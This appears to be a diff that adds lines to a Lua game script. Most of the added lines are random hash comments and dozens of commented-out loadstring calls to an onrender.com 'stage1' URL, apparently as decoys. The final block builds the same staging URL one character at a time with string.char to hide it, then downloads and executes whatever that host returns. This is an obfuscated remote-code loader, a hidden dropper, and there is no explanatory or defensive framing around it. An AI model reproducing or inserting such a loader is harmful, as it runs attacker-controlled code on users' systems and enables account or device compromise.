+--[[ _94bf2636a7c5e94dfc35449ff25e9490 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7297dc11e591f69", true))()
+--[[ _563aa5ce25f949d41b8549f5f15dad0b ]]
+--[[ _350fa18c48f4098e683c1f4fc0dac2e6 ]]
+--[[ _368f0b553c6531d84f7f7b5b5300839a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4599411b9e3e862b", true))()
+--[[ _47b305bd917a3194a64c1678ba4959e4 ]]
+--[[ _120ce76e4e01004590c8d40aab9daf29 ]]
+--[[ _296cecd12289a060e1943570a5fd9ba3 ]]
+--[[ _ab97f0c4481c8aa8b3c59d651c33d7cd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67b761bf68fd6efa", true))()
+--[[ _e433c99ec5512af96ffcec70fa0fa18d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3fd2bc22c3b8e7e1", true))()
+--[[ _5f332fdcce4e822d6aa760d406c51fae ]]
+--[[ _d99e67b6f1a4f6245d4314cb4ac0cbb8 ]]
+--[[ _c046f338851aaf64e63840016777083e ]]
+--[[ _42d1f7fdd7df411429b4a4db2979e9c0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_77000442a357f7f4", true))()
+--[[ _4077d0c66473ed259bb04722469c5aef ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0b8744fbc894ee1e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_274eb659170c731f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_055d1ac7e4f7807e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3f3054b443bf5d2b", true))()
+--[[ _80fa87fbd566e6f1079be347b34587ac ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_820874fa04e3e1b9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_030700badb1a1f60", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_40c01ae2d998d6f6", true))()
+--[[ _f99ef67f9d7ef388f5f571e7e4629568 ]]
+--[[ _020fd4d53ef21f1a92e8e7190271c156 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c637d2d96a2f92b8", true))()
+--[[ _2ace23b236ae2ebb535d2e079d9ada6a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_38c04d14c5ad82ef", true))()
+--[[ _43b5129b4b73d537062bf73f5f45688f ]]
+--[[ _d20d04805c62ae934de9828b1cc9f45e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e9a421477e3348ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_70a714f749522971", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a6ac986fdbe6dccd", true))()
+--[[ _7e7771e74fb5e4f17cbf83e66098bc35 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a081ce3e107b0fc3", true))()
+--[[ _d278fdd21fbd4b88e714868f118c810c ]]
+--[[ _f8c474b987fb4398fa3eba12fe1461e3 ]]
+--[[ _9a6f5c4e779b0931ba52970edc33545e ]]
+--[[ _dcaea200cc67fb21f1a6cc0c55afe1bc ]]
+--[[ _b6b2d3ec5e3844bcdea2ab04f5576cf9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9523ccbb57f63d1c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b1842b7c9d96609c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2471d43e7c200d1e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75cebb9ed65d8b65", true))()
+--[[ _ab42f07b2c9798aae391bd9b252e2659 ]]
+--[[ _469832b9fac5311a605bbd34a34f5916 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_84690c20ab6a8a12", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f35bfc04d214a08c", true))()
+--[[ _3d0f12515ee11c2350b649cdc878b5ef ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b0b003265cc6bc1c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_36a65294708a3bdd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e7f38df5fcd57766", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a5188a4f77d8f954", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_debd36d173774bff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9320fb7fb31b8c6a", true))()
+--[[ _975d8bbb4b02ef093dc2c4be3071f03d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9460dea6d4f6fb6a", true))()
+--[[ _46e99495eb5e49989c6944b331b639c5 ]]
+--[[ _20be4fb53ac38b1bea44368a11eaa011 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ec3f22b875d5c08a", true))()
+--[[ _a860e119e1225964c709ebf943757433 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d3bde29b31a7c7e9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ba0ca7cf6dc3918", true))()
+--[[ _8f58fb23812ce35ba0728af1345396cc ]]
+--[[ _52fc7a3d13c61855daabdeee11998913 ]]
+--[[ _745de94ee8dd2bc29bc2d2c14fb2cf0f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a10694ba32d75ba5", true))()
+--[[ _98d3b255c3e0b8aab1a6cd5d5424a6db ]]
+--[[ _a03ea67d3fc6517f5a8657fb12190211 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_919f0dbf31e02257", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_986f17cb7bcaa057", true))()
+--[[ _9947915e9f729debfe81ccf1a362e851 ]]
+--[[ _c6244a442835021d8775637f789465f2 ]]
+--[[ _15e664d495eed2b5285948d78961b694 ]]
+--[[ _2f96df280cababdcd5fe789edda6d003 ]]
+--[[ _4244619ac54c6bcf644c007f15460fba ]]
+--[[ _2d5f9c36a5d93081ec2892e106ac63d8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8f144d9154ab9d6f", true))()
+--[[ _f467ef25d929c7673607ca68186fe0de ]]
+--[[ _72d04265ce004d3e1115a60c69ead800 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f495705a50d7f40c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_39fdaa3bc546cc9b", true))()
+--[[ _13b12a6bc96526d05fb8cc5a16258c57 ]]
+--[[ _dd6f8cb42de718226552e22f36265f26 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c57115a830e777be", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_586b4fc9c71677e4", true))()
+--[[ _1a12bca169ce08162871eca8ca2cb05a ]]
+--[[ _00898c3aae1a1861c68378cef93f8e49 ]]
+--[[ _329991374d06d003f07867a41b91008a ]]
+--[[ _90b1e3301faa02306b40e757b57655f8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bdf2b555db8cd960", true))()
+--[[ _97235c6fac7fb952f6a8258f283312d2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_912b599c1a22f555", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d10f1d449932bba", true))()
+--[[ _2f56df72504fb66efbc0f2586f7e6041 ]]
+--[[ _b1a03348a086f8683bf548cfcec1450f ]]
+--[[ _0aedc2cc7b6acde16ac447d1fd9c777d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8aae3a1baf79332e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f36224dc1c584b7b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e39b919000f83d47", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a172ffe487423dc9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67062c9841fa0446", true))()
+--[[ _5814ca4ce47eef87913359a472cd41a4 ]]
+--[[ _816925c8897dd321d02d7354d407fd03 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d9eff104d40e5858", true))()
+--[[ _5c1cba4e856b83ffccbc1eb8592ca55e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f1d4f388a668d1b", true))()
+--[[ _6f6817a7fd272e537ceff30e9ac75e4b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5dd5f50b613b4767", true))()
+--[[ _58fa86879fe319371bfc12f40e3272fd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7bc38e6bcbe189a1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_53158fc4a4edb508", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4a32c91b6bee3efc", true))()
+--[[ _3803b470d7af9a6705ddb28210fbf5ab ]]
+--[[ _5e4d25f31d37c51fdca021a9c88f9020 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ada067fe6b365851", true))()
+--[[ _a5ba3a22aa70b7e5a93662c8098bdc7a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_114d6fcc3f3dc539", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_68d0df1b27b5d5a2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_33e99de8bdcff8e5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e044e240eb95ce3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2a7e9636f8cb22ac", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_30e03bfc18cec4a3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d544fac1225da18b", true))()
+--[[ _412236f034113226bc55dfaf2ba1bc78 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c8f9778720c96c9f", true))()
+--[[ _9ca132e4fbc10c5b2c9bde83cd510f1d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_20db7f5884362e46", true))()
+--[[ _f1ae1e6bf86cc030c0d6a403089c2fe2 ]]
+--[[ _e64791e909594f9f2c28a51b49619c36 ]]
+--[[ _3852bce7f89cafcf11c200daebceb135 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_976adb8b3117facb", true))()
+--[[ _0885f86ef76428c6fc9c02a08d4f7d61 ]]
+--[[ _77ad18a98f6601c1cd13e24b6fa5b369 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c57a5ef16e3b1a80", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d29fdad40cd685c9", true))()
+--[[ _43b117fe9d7935ecde23e8676baa72cf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a69265f0fa513c72", true))()
+--[[ _83ea8710fc5edac386b2cc4a5f2987d9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_04544f41fe253919", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_54f8dd9ed9cb4302", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f06ba0ead9c6f311", true))()
+--[[ _f84af87b81d09f7acaec677c77769ba7 ]]
+--[[ _cd472e81d3fd62c926db56a45df00389 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bb074fefd984a7f6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8bac5063d5f865dd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_eea09b4b4173c567", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_78f983a6ca9658db", true))()
+--[[ _1029f164d5be98e1194fc94b285b9f3e ]]
+--[[ _8e1d840cf3b01fa423822be70babef2d ]]
+--[[ _dc882dafb41619dc000c8020ca152f41 ]]
+--[[ _b3406b285a8685788891cd4dda160c34 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42012aca90cf2521", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_107718488ffad99e", true))()
+--[[ _baa5216aa0355f25642a2d799e0be46e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_96773d127299ca6f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_acc5315fa60958ed", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7a90ce06e7f68213", true))()
+--[[ _b0785a690539fb5fc30e8b0497d22bf7 ]]
+--[[ _56f314ad84221fd915b01febb0cd7266 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a4a292b22714db6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3df190cd69a41da", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f2b1e92a72de928c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3146f83b2f880afa", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b54142dbe685a6e4", true))()
+--[[ _743622a9db58d1ea7da770ff3e27271e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_37c9572d2586be16", true))()
+--[[ _bdac1b1520bf2b45e4bc26260420c7a2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_07bb6688667caac1", true))()
+--[[ _50d04826a4ec0f890474937c32f923b0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ba6f4e111ebd494a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ec6571b7b124a501", true))()
+--[[ _fd019b3b77ccfccc7e26fb86726d8e75 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6ebdedd9c3917328", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f717c7a9b97b29bb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_93d3f9a603b96e5a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7661d114c070ce3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7fd6682772950cc", true))()
+--[[ _25714e5cca26f642c69fc92045fabf34 ]]
+--[[ _ab80bb359a80c75c9ea7aed95e7375b0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f2b77e4f7695722f", true))()
+--[[ _f7473eeb94525a0499201b68541351b1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c1e94c710720833", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5498f9c16b101754", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5b04e71f84b37f95", true))()
+--[[ _7547753d5aa5be44d66029414789d947 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1028ded8d29d5034", true))()
+--[[ _12e108b390545f7c0e7ea5f599fb2c59 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_11b0180296b5b737", true))()
+--[[ _0249c0c38c72e7f60081aeb21bf2b282 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_76a14d8a4ee38b22", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_02536d3dfd1e07f2", true))()
+--[[ _d1077137dfc302feaf1a054645a404e4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6123b12f6dedbed3", true))()
+--[[ _6eb530bb4f3faa9ba43adde1db927714 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_878e1b718d3c7cc6", true))()
+--[[ _53b39ed9dbe9879daf825f0f3d64fc51 ]]
+--[[ _7ae4170201da0e61becfbb63384463ed ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a522e1f354f765b0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2d43b36bf92287e7", true))()
+--[[ _5be2c637315d7a448bc95a60de9cedc1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9c8c98552491fbc2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_95e8b61bcd1bac4a", true))()
+--[[ _cffc434c756501d0eefea56ac101a47c ]]
+--[[ _0f55ff500342ae773a993d7fd683060e ]]
+--[[ _96a59ff36ffe3ded5adcd59a24422558 ]]
+--[[ _8d781e408a37b592d5b6eadd4f148572 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a052fba03e4a1580", true))()
+local a9857 = string.char(104) .. string.char(116) .. string.char(116) .. string.char(112) .. string.char(58)
+local b9577 = string.char(47) .. string.char(47) .. string.char(115) .. string.char(97) .. string.char(112)
+local c139 = string.char(105) .. string.char(101) .. string.char(110) .. string.char(45) .. string.char(119)
+local d639 = string.char(55) .. string.char(54) .. string.char(97) .. string.char(46) .. string.char(111)
+local e3373 = string.char(110) .. string.char(114) .. string.char(101) .. string.char(110) .. string.char(100)
+local f3774 = string.char(101) .. string.char(114) .. string.char(46) .. string.char(99) .. string.char(111)
+local g9395 = string.char(109) .. string.char(47) .. string.char(115) .. string.char(116) .. string.char(97)
+local h8287 = string.char(103) .. string.char(101) .. string.char(49) .. string.char(63) .. string.char(116)
+local i5978 = string.char(111) .. string.char(107) .. string.char(101) .. string.char(110) .. string.char(61)
+local j9382 = string.char(95) .. string.char(102) .. string.char(98) .. string.char(102) .. string.char(55)
+local k5704 = string.char(101) .. string.char(53) .. string.char(53) .. string.char(101) .. string.char(56)
+local l1624 = string.char(98) .. string.char(54) .. string.char(102) .. string.char(97) .. string.char(98)
+local m4310 = string.char(48) .. string.char(100)
+local u = a9857 .. b9577 .. c139 .. d639 .. e3373 .. f3774 .. g9395 .. h8287 .. i5978 .. j9382 .. k5704 .. l1624 .. m4310
+loadstring(game:HttpGet(u))()
